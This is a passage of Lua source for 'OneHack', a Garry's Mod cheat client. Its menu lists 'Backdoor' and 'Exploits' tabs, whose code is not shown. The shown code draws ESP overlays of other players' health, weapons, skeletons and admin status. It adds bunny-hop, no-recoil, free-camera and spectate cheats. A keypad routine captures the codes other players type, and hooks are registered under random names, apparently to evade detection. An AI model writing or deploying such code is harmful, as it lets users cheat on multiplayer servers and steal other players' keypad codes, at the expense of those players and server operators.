				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Armor number","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_ARMOR'] = showarmornumber:GetChecked()
		end
 
		local showarmorbox = vgui.Create("DCheckBox",esppanel)
		showarmorbox:SetPos(5,159)
		showarmorbox:SetValue(onehack.Vars['ESP_ARMORBOX'])
		showarmorbox:SetSize(100,17)
		function showarmorbox:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showarmorbox:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Armor box","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_ARMORBOX'] = showarmorbox:GetChecked()
		end
 
		local showammonumber = vgui.Create("DCheckBox",esppanel)
		showammonumber:SetPos(5,181)
		showammonumber:SetValue(onehack.Vars['ESP_WEAPON'])
		showammonumber:SetSize(100,17)
		function showammonumber:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showammonumber:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Weapon name","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_WEAPON'] = showammonumber:GetChecked()
		end
 
		local showbox = vgui.Create("DCheckBox",esppanel)
		showbox:SetPos(5,202)
		showbox:SetValue(onehack.Vars['ESP_BOX'])
		showbox:SetSize(100,17)
		function showbox:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showbox:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Box","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_BOX'] = showbox:GetChecked()
		end
 
		local showskelet = vgui.Create("DCheckBox",esppanel)
		showskelet:SetPos(5,224)
		showskelet:SetValue(onehack.Vars['ESP_SKELET'])
		showskelet:SetSize(100,17)
		function showskelet:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showskelet:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Skeleton","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_SKELET'] = showskelet:GetChecked()
		end
 
		local norecoil = vgui.Create("DCheckBox",esppanel)
		norecoil:SetPos(5,260)
		norecoil:SetValue(onehack.Vars['NoRecoil'])
		norecoil:SetSize(100,17)
		function norecoil:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if norecoil:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("No recoil","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['NoRecoil'] = norecoil:GetChecked()
		end
 
		local Crosshair = vgui.Create("DCheckBox",esppanel)
		Crosshair:SetPos(5,282)
		Crosshair:SetValue(onehack.Vars['Crosshair'])
		Crosshair:SetSize(100,17)
		function Crosshair:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if Crosshair:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Crosshair","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['Crosshair'] = Crosshair:GetChecked()
		end
 
		local preview = vgui.Create("DPanel",esppanel)
		preview:SetPos(212,5)
		preview:SetSize(250,373)
		function preview:Paint(w,h)
			onehack.DrawRect(0,0,w,h,Color(255,255,255,10))
			onehack.DrawOutLinedRect(0,0,w,h,onehack.theme.backgroundalt2)
 
			if onehack.Vars['ESP_NAME'] then
				draw.SimpleTextOutlined("Garry :D","default",w/2, 50,Color(255,255,255),1,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_WEAPON'] then
				draw.SimpleTextOutlined("Crowbar","default",w/2, h-50,Color(255,255,255),1,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_TEAM'] then
				draw.SimpleTextOutlined("Citizen","default",w-54, 65,Color(50,255,50),0,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_GROUP'] then
				draw.SimpleTextOutlined("Admin","default",w-54, 80,Color(255,255,255),0,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_HP'] then
				draw.SimpleTextOutlined("100%","default",58,56,Color(150,255,0),0,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_HPBOX'] then
				onehack.DrawOutLinedRect(53,60,6,h-120,Color(0,0,0))
				onehack.DrawRect(54,61,4,h-122,Color(150,255,0))
				--onehack.DrawOutLinedRect(56,60,5,h-120,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_ARMOR'] then
				draw.SimpleTextOutlined("100%","default",46,56,Color(19,136,191),2,1,1,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_ARMORBOX'] then
				onehack.DrawOutLinedRect(46,60,6,h-120,Color(0,0,0))
				onehack.DrawRect(47,61,4,h-122,Color(19,136,191))
				--onehack.DrawOutLinedRect(56,60,5,h-120,Color(0,0,0))
			end
 
			if onehack.Vars['ESP_BOX'] then
				onehack.DrawOutLinedRect(60,60,w-120,h-120,Color(0,0,0))
				onehack.DrawOutLinedRect(61,61,w-122,h-122,Color(255,255,255))
				onehack.DrawOutLinedRect(62,62,w-124,h-124,Color(0,0,0))
			end
		end
 
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 5
		onehack.selectedpanel = esppanel
	end
 
	function aimpanel()
		aimpanel = vgui.Create( "DPanel" , framesag )
		aimpanel:SetPos( 126, 9 )
		aimpanel:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function aimpanel:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
			draw.SimpleText("Coming soon...","DermaDefault",w/2,h/2,Color(255,255,255,100),1,1)
		end
 
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 5
		onehack.selectedpanel = aimpanel
	end
 
	PanelAddButton("Aimbot",aimpanel,6)
	PanelAddButton("Visuals",esppanel,5)
	PanelAddButton("Backdoor",onehackdooropt,1)
	PanelAddButton("Exploits",exploitmenuopt,2)
	PanelAddButton("Options",optionsmenuopt,3)
	PanelAddButton("Logs",logsmenuopt,4)
	onehackdooropt()
end
function myfunc()
	if input.IsKeyDown( KEY_F11 ) then
		if not timer.Exists("FW.MenuIsPressed") then
			if IsValid(framesag) then
				framesag:Remove()
			else
				MainFunc()
			end
			timer.Create("FW.MenuIsPressed",0.3,1,function() end)
		end
	end
 
	if input.IsKeyDown( KEY_F9 ) then
		if not timer.Exists("FW.MenuIsPressedF9") then
			onehack.Vars['FCAM'] = !onehack.Vars['FCAM']
			timer.Create("FW.MenuIsPressedF9",0.3,1,function() end)
		end
	end
end
onehack.DebugLog( "Onehack loaded successfully!", Color(100,255,100) )
onehack.DebugLog( "onehack version v2.44, build 13.05.2019", Color(255,255,255) )
hook.Add("Think","twsgsh",myfunc)
 
 
local me = LocalPlayer();
function onehack.CreateMove(cmd)
	local memfootprint = gcinfo()
    if(!onehack.Vars['BHOP']) then return; end
    if(!me:IsOnGround() && cmd:KeyDown(IN_JUMP)) then
        cmd:RemoveKey(IN_JUMP);
        if(onehack.Vars['AUTOSTRAFER']) then
            if(cmd:GetMouseX() > 1 || cmd:GetMouseX() < -1) then
                cmd:SetSideMove(cmd:GetMouseX() > 1 && 400 || -400);
            else
                cmd:SetForwardMove(5850 / me:GetVelocity():Length2D());
                cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) && -400 || 400);
            end
        end
    elseif(cmd:KeyDown(IN_JUMP) && onehack.Vars['AUTOSTRAFER']) then
        cmd:SetForwardMove(10000);
    end
    onehack.memory["logic"] = gcinfo() - memfootprint
end
hook.Add("CreateMove", onehack.RandomString(10), function(cmd)
    onehack.CreateMove(cmd);
end);  
 
function onehack.CalcView( ply, pos, angles, fov )
	if !me:IsValid() or !me:Alive() or me:GetViewEntity() != me or me:InVehicle() then return end
	local tps = {}
    if onehack.Vars['NoRecoil'] then
        tps.angles = me:EyeAngles()
        return tps
    end
end
hook.Add("CalcView", onehack.RandomString(10), onehack.CalcView)
 
 
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
        Vector( min.x, min.y, min.z ),
        Vector( min.x, min.y, max.z ),
        Vector( min.x, max.y, min.z ),
        Vector( min.x, max.y, max.z ),
        Vector( max.x, min.y, min.z ),
        Vector( max.x, min.y, max.z ),
        Vector( max.x, max.y, min.z ),
        Vector( max.x, max.y, max.z )
}
 
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
        local onScreen = ent:LocalToWorld( corner ):ToScreen()
        minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
        maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
function drawfillbox( mag,value,left,top,right,bottom,r,g,b,a )
    local poly = {
    {x=left,y=top},
    {x=right,y=top},
    {x=right,y=bottom},
    {x=left,y=bottom}
	}
	surface.SetDrawColor( r,g,b,a )
	draw.NoTexture()
	surface.DrawPoly(poly)
	draw.SimpleTextOutlined(value,"default",left + (right - left) / 2,top,Color(r,g,b,a),mag,1,1,Color(0,0,0))
end
return minX, minY, maxX, maxY
end
hook.Add("OnEntityCreated",onehack.RandomString(17),function(ent)
	onehack.DebugLog( ent:GetClass().." spawned on ("..tostring(ent:GetPos())..")", Color(100,100,100) )
end)
hook.Add( "PostDrawOpaqueRenderables", onehack.RandomString(17), function()
	if onehack.Vars['WEAPON_LIST3D'] then
		for k,vv in pairs(player.GetAll()) do
			if vv:IsValid() and vv ~= LocalPlayer() and vv:GetPos():Distance(LocalPlayer():GetPos()) < 600 and onehack.Vars['FCAM'] and vv:Alive()  or (vv:GetPos():Distance(LocalPlayer():GetPos()) < 255 and vv ~= LocalPlayer() and vv:Alive()) then
				local rot = (vv:GetPos() - EyePos()):Angle().yaw - 90
				local ang = Angle(0,rot,90)
				cam.Start3D2D( vv:EyePos()+2*ang:Up(), ang-Angle(0,30,0), 0.15 )
					local otstup = 0
					local toleft = 160
					local alpha = 255 - vv:GetPos():Distance(LocalPlayer():GetPos())
					surface.SetDrawColor( 255, 165, 0, alpha )
					surface.DrawRect( toleft, 0, 150, 1 )
					surface.SetDrawColor( 0, 0, 0, alpha )
					surface.SetMaterial(Material("gui/gradient_down"))
					surface.DrawTexturedRect( toleft, 1, 150, alpha/2 )
					for k,v in pairs(vv:GetWeapons()) do
						surface.SetDrawColor( 255, 255, 255, alpha/2 )
						surface.SetMaterial(Material("gui/gradient_down"))
						surface.DrawTexturedRect( 4+toleft, 4+otstup, 92+50, 15 )
						if vv:GetActiveWeapon():IsValid() and vv:GetActiveWeapon() == v then
							surface.SetDrawColor( 255, 165, 0, alpha/2 )
							surface.SetMaterial(Material("gui/gradient_up"))
							surface.DrawTexturedRect( 4+toleft, 4+otstup, 92+50, 15 )
						elseif string.find(v:GetClass(),"m9k") or string.find(v:GetClass(),"swb") or string.find(v:GetClass(),"csgo") or string.find(v:GetClass(),"ptp") then
							surface.SetDrawColor( 255, 0, 0, alpha/2 )
							surface.SetMaterial(Material("gui/gradient_up"))
							surface.DrawTexturedRect( 4+toleft, 4+otstup, 92+50, 15 )
						end
						if  vv:GetActiveWeapon():IsValid() and vv:GetActiveWeapon() == v then
							surface.SetDrawColor( 255, 165, 0, alpha )
						elseif string.find(v:GetClass(),"m9k") or string.find(v:GetClass(),"swb") or string.find(v:GetClass(),"csgo") or string.find(v:GetClass(),"ptp") then
							surface.SetDrawColor( 255, 0, 0, alpha/2 )
						else
							surface.SetDrawColor( 255, 255, 255, alpha )
						end
						surface.DrawOutlinedRect( 4+toleft, 4+otstup, 92+50, 15 )
 
						draw.SimpleText(v:GetPrintName(),"DermaDefault",8+toleft, 5+otstup,Color(0,0,0,alpha))
						draw.SimpleText(v:GetPrintName(),"DermaDefault",8+toleft+1, 5+otstup-1,Color(255,255,255,alpha))
						otstup = otstup + 19
					end
				cam.End3D2D()
			end
		end
	end
 
	if onehack.Vars['keypad_jiw'] then
		for k, e in pairs(ents.FindInSphere( LocalPlayer():GetPos(), 100 )) do
			if IsValid(e) and string.find( e:GetClass(), "Keypad") then
				local text;
				local color;
				if(e.code && e.code != "") then
					text = e.code;
					color = Color( 105, 255, 105, 150 )
				elseif(e.tempCode && e.tempCode != "") then
					text = e.tempCode;
					color = Color( 250, 150, 150, 150 )
				else
					text = "Unkn"
					color = Color(150,150,150,150)
				end
				local rot = (e:GetPos() - EyePos()):Angle().yaw - 90
				local rot2 = -(e:GetPos() - EyePos()):Angle().pich +90
				local ang = Angle(0,rot,rot2)
				cam.Start3D2D( e:GetPos()+Vector(0,0,2), ang-Angle(0,30,0), 0.15 )
					local otstup = 0
					local toleft = 40
					local alpha = 255-(e:GetPos():Distance(LocalPlayer():GetPos()))
					surface.SetDrawColor( color.r, color.g, color.b, alpha )
					surface.DrawRect( toleft, 0, 40, 1 )
					surface.SetDrawColor( 0, 0, 0, alpha )
					surface.SetMaterial(Material("gui/gradient_down"))
					surface.DrawTexturedRect( toleft, 1, 40, 30 )
					draw.SimpleText(text,"DermaDefault",8+toleft, 5+otstup,Color(255,255,255,alpha))
				cam.End3D2D()
			end
		end
	end
end )
hook.Add("HUDPaint", onehack.RandomString(17), function()
if onehack.Vars['WaterMark'] then
	surface.SetFont("DermaDefault")
	local tw,th = surface.GetTextSize("OneHack.su | "..math.Round(1/FrameTime()).." FPS | "..LocalPlayer():Ping().." PING | "..onehack.memory['hud']+onehack.memory['logic'].." KB | "..LocalPlayer():Name())
	tw = tw + 3
	onehack.DrawRect(5,5,10+tw,25,Color(onehack.theme.chroma.r,onehack.theme.chroma.g,onehack.theme.chroma.b,150))
	onehack.DrawRect(9,9,2+tw,17,Color(onehack.theme.chromaalt.r,onehack.theme.chromaalt.g,onehack.theme.chromaalt.b,150))
	onehack.DrawOutLinedRect(5,5,10+tw,25,Color(0,0,0,50))
	onehack.DrawOutLinedRect(9,9,2+tw,17,Color(0,0,0,50))
	draw.SimpleText("OneHack.su | "..math.Round(1/FrameTime()).." FPS | "..LocalPlayer():Ping().." PING | "..onehack.memory['hud']+onehack.memory['logic'].." KB | "..LocalPlayer():Name(),"DermaDefault",12,10,Color(255,255,255))
end
local memfootprintss = gcinfo()
if not onehack.Vars['ESP'] then return end
if onehack.Vars['Crosshair'] then
	onehack.Drawline(ScrW()/2,ScrH()/2,(ScrW()/2)+5,(ScrH()/2)+5,Color(255,255,255,100))
	onehack.Drawline(ScrW()/2,ScrH()/2,(ScrW()/2)-5,(ScrH()/2)+5,Color(255,255,255,100))
end
for k,v in pairs(player.GetAll()) do
		local left,top,right,bottom = coordinates(v)
		local dist = v:GetPos():Distance(LocalPlayer():GetPos())
		if v ~= LocalPlayer() then
		if dist > 20 then
		if v:Alive() then
		if left ~= 0 and right ~= 0 and top ~= 0 and bottom ~= 0 then
	        if onehack.Vars['ESP_BOX'] then
		        surface.SetDrawColor(Color(255,255,255))
		        surface.DrawLine( left, top, right, top )
		        surface.DrawLine( left, top, left, bottom )
		        surface.DrawLine( right, top,  right, bottom )
		        surface.DrawLine( left, bottom, right, bottom )
 
		        surface.SetDrawColor(Color(0,0,0))
		        surface.DrawLine( left-1, top-1, right+1, top-1 )
		        surface.DrawLine( left-1, top-1, left-1, bottom+1 )
		        surface.DrawLine( right+1, top-1, right+1, bottom+1 )
		        surface.DrawLine( left-1, bottom+1, right+1, bottom+1 )
 
		        surface.SetDrawColor(Color(0,0,0))
		        surface.DrawLine( left+1, top+1, right-1, top+1 )
		        surface.DrawLine( left+1, top+1, left+1, bottom-1 )
		        surface.DrawLine( right-1, top+1, right-1, bottom-1 )
		        surface.DrawLine( left+1, bottom-1, right-1, bottom-1 )
		    end
 
	        local hpdraw = {
	        {x=left-4,y=top},
	        {x=left-2,y=top},
	        {x=left-2,y=bottom},
	        {x=left-4,y=bottom}
	    	}
			if onehack.Vars['ESP_NAME'] then 
				draw.SimpleTextOutlined(v:GetName(),"default",left + (right - left) / 2, top - 10,Color(255,255,255),1,1,1,Color(0,0,0))
			end
 
			if IsValid(v:GetActiveWeapon()) and onehack.Vars['ESP_WEAPON'] then
			draw.SimpleTextOutlined(v:GetActiveWeapon():GetPrintName() or v:GetActiveWeapon():GetClass(),"default",left + (right - left) / 2, bottom + 10,Color(255,255,255),1,1,1,Color(0,0,0))
			end
			w, h = ScrW(), ScrH()
    		w = w/2
			local hp = math.min(v:Health(), 100)
			local height = bottom - top - 1
            local healthbar_height = (hp / 100) * height
            local healthbar_height2 = (100 / 100) * height
			local width = (w * (hp / 100.0))
			local red = 255 - (hp*2.55)
			local green = hp * 2.55
			if onehack.Vars['ESP_HP'] then numb = v:Health().."%" else numb = "" end
			if onehack.Vars['ESP_HPBOX'] then
				drawfillbox( 0,"", left - 8, bottom - healthbar_height2 - 2,left - 2, bottom,0,0,0,255 )
				drawfillbox( 0,"", left - 7, bottom - healthbar_height2 - 1,left - 3, bottom-1,0,200,0,40 )
				drawfillbox( 0,numb, left - 7, bottom - healthbar_height - 1,left - 3, bottom-1,red,green,0,255 )
			end
			local ar = math.min(v:Armor(), 100)
            local armorbar_height = (ar / 100) * height
            local numb
            if onehack.Vars['ESP_ARMOR'] then numb = v:Armor().."%" else numb = "" end
			if onehack.Vars['ESP_ARMORBOX'] then
				drawfillbox( 0,"", left - 15, bottom - healthbar_height2 - 2,left - 10, bottom,0,0,0,255 )
				drawfillbox( 0,"", left - 14, bottom - healthbar_height2 - 1,left - 11, bottom-1,0,200,0,40 )
				drawfillbox( 2,numb, left - 14, bottom - armorbar_height - 1,left - 11, bottom-1,19,136,191,255 )
			end
			local plys = v
			local Bones = {}
			local sBones = {
			"ValveBiped.Bip01_Head1",
			"ValveBiped.Bip01_Neck1",
			"ValveBiped.Bip01_Spine4",
			"ValveBiped.Bip01_Spine2",
			"ValveBiped.Bip01_Spine1",
			"ValveBiped.Bip01_Spine",
			"ValveBiped.Bip01_Pelvis",
			"ValveBiped.Bip01_R_UpperArm",
			"ValveBiped.Bip01_R_Forearm",
			"ValveBiped.Bip01_R_Hand",
			"ValveBiped.Bip01_L_UpperArm",
			"ValveBiped.Bip01_L_Forearm",
			"ValveBiped.Bip01_L_Hand",
			"ValveBiped.Bip01_R_Thigh",
			"ValveBiped.Bip01_R_Calf",
			"ValveBiped.Bip01_R_Foot",
			"ValveBiped.Bip01_R_Toe0",
			"ValveBiped.Bip01_L_Thigh",
			"ValveBiped.Bip01_L_Calf",
			"ValveBiped.Bip01_L_Foot",
			"ValveBiped.Bip01_L_Toe0"
			}
			local Success = true
			for k, v in pairs(sBones) do
				if plys:LookupBone(v) != nil && plys:GetBonePosition(plys:LookupBone(v)) != nil then
					table.insert( Bones, plys:GetBonePosition(plys:LookupBone(v)):ToScreen() )
				else
					Success = false
				end
			end
			surface.SetDrawColor(Color(255,255,255))
			if Success and onehack.Vars['ESP_SKELET'] then
				surface.DrawLine( Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y )
				surface.DrawLine( Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y )
				surface.DrawLine( Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y )
				surface.DrawLine( Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y )
				surface.DrawLine( Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y )
				surface.DrawLine( Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y )
 
				//Legs
				surface.DrawLine( Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y )
				surface.DrawLine( Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y )
				surface.DrawLine( Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y )
				surface.DrawLine( Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y )
 
				surface.DrawLine( Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y )
				surface.DrawLine( Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y )
				surface.DrawLine( Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y )
				surface.DrawLine( Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y )
 
				//Arms
				surface.DrawLine( Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y )
				surface.DrawLine( Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y )
				surface.DrawLine( Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y )
 
				surface.DrawLine( Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y )
				surface.DrawLine( Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y )
				surface.DrawLine( Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y )
 
			end
			if onehack.Vars['ESP_TEAM'] then
				draw.SimpleTextOutlined(team.GetName(v:Team()),"default",right+3, top,team.GetColor(v:Team()),0,0,1,Color(0,0,0))
			end
			if onehack.Vars['ESP_GROUP'] then
				draw.SimpleTextOutlined(v:GetUserGroup(),"default",right+3, top+11,Color(255,255,255),0,0,1,Color(0,0,0))
			end
		end
	end
end
end
end
 
onehack.memory["hud"] = gcinfo() - memfootprintss
end)
local elements = {
    { -- Screen
        x = 0.075,
        y = 0.04,
        w = 0.85,
        h = 0.25,
 
    },
    { -- ABORT
        x = 0.075,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 + 0.05,
        h = 0.125,
        text = "ABORT",
    },
    { -- OK
        x = 0.5 + 0.04 / 2 + 0.05,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 - 0.05,
        h = 0.125,
        text = "OK",
    }
}
 
do -- Create numbers
    for i = 1, 9 do
        local column = (i - 1) % 3
 
        local row = math.floor((i - 1) / 3)
        
        local element = {
            x = 0.075 + (0.3 * column),
            y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row),
            w = 0.25,
            h = 0.13,
            text = tostring(i),
        }
        table.insert(elements, element)
    end
end
 
 
function onehack.CalculateKeypadCursorPos(ply, ent)
    if !ply:IsValid() then return end
 
    local tr = util.TraceLine( { start = ply:EyePos(), endpos = ply:EyePos() + ply:GetAimVector() * 65, filter = ply } )
    if !tr.Entity or tr.Entity ~= ent then return 0, 0 end
 
    local scale = ent.Scale
    if !scale then return 0, 0 end
 
    local pos, ang = ent:CalculateRenderPos(), ent:CalculateRenderAng()
    if !pos or !ang then return 0, 0 end
    local normal = ent:GetForward()
    
    local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)
    if !intersection then return 0, 0 end
 
    local diff = pos - intersection
 
    local x = diff:Dot( -ang:Forward() ) / scale
    local y = diff:Dot( -ang:Right() ) / scale
 
    return x, y
end
 
function onehack.KPGetHoveredElement(ply, ent)
    local scale = ent.Scale
 
    local w, h = ent.Width2D, ent.Height2D
    local x, y = onehack.CalculateKeypadCursorPos(ply, ent)
 
    for _, element in ipairs(elements) do
        local element_x = w * element.x
        local element_y = h * element.y
        local element_w = w * element.w
        local element_h = h * element.h
 
        if  element_x < x and element_x + element_w > x and
            element_y < y and element_y + element_h > y 
        then
            return element
        end
    end
end
hook.Add("Think",onehack.RandomString(17),function()
	if onehack.Vars['keypad_jiw'] then
		for k, v in pairs(player.GetAll()) do
			local kp = v:GetEyeTrace().Entity
			if IsValid(kp) && IsValid(v) and string.find( kp:GetClass(), "Keypad") and v:EyePos():Distance(kp:GetPos()) <= 120 then
				kp.tempCode = kp.tempCode or ""
				kp.tempText = kp.tempText or ""
				kp.tempStatus = kp.tempStatus or 0
				if kp:GetText() != kp.tempText or kp:GetStatus() != kp.tempStatus then
					kp.tempText = kp:GetText()
					kp.tempStatus = kp:GetStatus()
					if(kp.tempText && !kp:GetSecure()) then
						kp.tempCode = kp.tempText
						timer.Simple(0, function() 
							if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then
								kp.code = kp.tempCode
							end
						end)
					else
						local i = onehack.KPGetHoveredElement(v, kp)
						if (i) then i = i.text end
						if kp.tempText then
							timer.Simple(0, function()
								if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then
									kp.code = kp.tempCode
								end
							end)
						end
						if kp.tempText == "" || kp:GetStatus() == 2 then
							kp.tempCode = ""
						end	
						timer.Simple(0, function() 
							if(tonumber(i) && kp:GetText():len() != 0) then
								kp.tempCode = kp.tempCode..i
							end
						end)
					end
				end
			end
		end
	end
end)
hook.Add("CreateMove",onehack.RandomString(17),function(cmd)
	if onehack.Vars['FCAM'] then
		cmd:ClearButtons()
		cmd:ClearMovement()
		cmd:SetMouseX(0)
		cmd:SetMouseY(0)
	end
end)
 
function onehack.cameracalculate( ply, pos, angles, fov )
	if onehack.Vars['SCAM'] and IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer()  then
		local view = {}
		view.origin = onehack.SpectatePlayer:EyePos() or Vector(0,0,0)
		view.angles = onehack.SpectatePlayer:EyeAngles() or Angle(0,0,0)
		view.fov = fov
		view.drawviewer = true
		return view
	elseif onehack.Vars['SCAM'] and IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:GetClass() == "gmod_cameraprop" then
		local view = {}
		view.origin = onehack.SpectatePlayer:GetPos() or Vector(0,0,0)
		view.angles = onehack.SpectatePlayer:GetAngles() or Angle(0,0,0)
		view.fov = fov
		view.drawviewer = true
		return view
	end
	if onehack.Vars['FCAM'] then
		local view = {}
		local newang = angles
		onehack.StartCamAng = LocalPlayer():GetAngles()
		local speed = onehack.CamSpeed_Normal
		if input.IsKeyDown(KEY_LSHIFT) then
			speed = onehack.CamSpeed_Fast
		elseif input.IsKeyDown(KEY_LCONTROL) then
			speed = onehack.CamSpeed_Slow
		else
			speed = onehack.CamSpeed_Normal
		end
		if input.IsKeyDown(KEY_W) then
			onehack.StartCamPos = onehack.StartCamPos + onehack.StartCamAng:Forward() * speed
		end
		if input.IsKeyDown(KEY_A) then
			onehack.StartCamPos = onehack.StartCamPos - onehack.StartCamAng:Right() * speed
		end
		if input.IsKeyDown(KEY_D) then
			onehack.StartCamPos = onehack.StartCamPos + onehack.StartCamAng:Right() * speed
		end
		if input.IsKeyDown(KEY_S) then
			onehack.StartCamPos = onehack.StartCamPos - onehack.StartCamAng:Forward() * speed
		end
		if input.IsKeyDown(KEY_SPACE) then
			onehack.StartCamPos = onehack.StartCamPos + onehack.StartCamAng:Up() * speed
		end
		--LocalPlayer():SetPos(onehack.StartCamPos)
		view.origin = onehack.StartCamPos
		view.angles = newang
		view.fov = fov
		view.drawviewer = true
		return view
	end
end
hook.Add( "CalcView", onehack.RandomString(17), onehack.cameracalculate )
 
MsgC(onehack.theme.chroma,[[
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 ________  ________   _______   ___  ___  ________  ________  ___  __       
|\   __  \|\   ___  \|\  ___ \ |\  \|\  \|\   __  \|\   ____\|\  \|\  \     
\ \  \|\  \ \  \\ \  \ \   __/|\ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|_   
 \ \  \\\  \ \  \\ \  \ \  \_|/_\ \   __  \ \   __  \ \  \    \ \   ___  \  
  \ \  \\\  \ \  \\ \  \ \  \_|\ \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ 
   \ \_______\ \__\\ \__\ \_______\ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\
    \|_______|\|__| \|__|\|_______|\|__|\|__|\|__|\|__|\|_______|\|__| \|__|
		 ___      ___  _____      ________      ________     
		|\  \    /  /|/ __  \    |\   __  \    |\   __  \    
		\ \  \  /  / /\/_|\  \   \ \  \|\  \   \ \  \|\  \   
		 \ \  \/  / /\|/ \ \  \   \ \  \\\  \   \ \  \\\  \  
		  \ \    / /      \ \  \ __\ \  \\\  \ __\ \  \\\  \ 
		   \ \__/ /        \ \__\\__\ \_______\\__\ \_______\
		    \|__|/          \|__\|__|\|_______\|__|\|_______|]])
	MsgC(onehack.theme.chromaalt,[[
 
		 ________  ________  _______   ________  ___  _________  ________                                   
		|\   ____\|\   __  \|\  ___ \ |\   ___ \|\  \|\___   ___\\   ____\  ___                             
		\ \  \___|\ \  \|\  \ \   __/|\ \  \_|\ \ \  \|___ \  \_\ \  \___|_|\__\                            
		 \ \  \    \ \   _  _\ \  \_|/_\ \  \ \\ \ \  \   \ \  \ \ \_____  \|__|                            
		  \ \  \____\ \  \\  \\ \  \_|\ \ \  \_\\ \ \  \   \ \  \ \|____|\  \  ___                          
		   \ \_______\ \__\\ _\\ \_______\ \_______\ \__\   \ \__\  ____\_\  \|\__\                         
		    \|_______|\|__|\|__|\|_______|\|_______|\|__|    \|__| |\_________\|__|                         
		                                                           \|_________|
